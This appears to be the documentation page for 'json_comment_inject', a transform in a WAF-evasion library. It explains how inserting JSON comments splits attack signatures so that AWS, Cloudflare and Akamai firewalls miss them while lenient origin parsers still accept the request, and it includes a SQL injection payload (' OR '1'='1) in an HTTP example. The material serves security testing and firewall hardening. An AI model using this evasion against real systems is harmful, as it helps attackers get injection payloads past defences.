# json_comment_inject

Category: json_differential | Risk: conditional | Applies to: aws+cloudflare+akamai | Fidelity: differential

> **Impact:** **Impact: conditional.** The wire payload DIFFERS from the original;
the origin interprets it correctly only if its parser behaves as
documented here. Delivery alone is not exploitation - prove it with
`python -m waf_requests verify <url>`.

## Mechanism
The transform injects `/*x*/` comments between JSON tokens, splitting signature-bearing literals across comment boundaries. The wire form is no longer strict JSON.

## Why the WAF misses it
Scanners matching contiguous byte sequences cannot match a signature split by an inline comment. Unless the engine strips comments first, every split anchor fails.

## Why the origin still accepts it
Some lenient parsers strip JavaScript-style comments before parsing. After stripping they see clean JSON and decode the original values. Tests verify equality only after stripping comments from the transformed document.

## Wire example

Generated by applying this transform to a representative request (fidelity tier: **differential**).

Original:

```http
POST /search HTTP/1.1
Host: shop.test
Content-Type: application/json
Content-Length: 20

{"q": "' OR '1'='1"}
```

After `json_comment_inject`:

```http
POST /search HTTP/1.1
Host: shop.test
Content-Type: application/json
Content-Length: 27

{/*waf*/"q": "' OR '1'='1"}
```

## Prerequisites and limits
- Strict RFC 8259 parsers reject comments, so most modern stacks fail. This is why the transform stays experimental.
- Wins only against documented lenient parsers that accept comments.
- The library treats it as conditional/experimental and gates it behind an explicit flag.
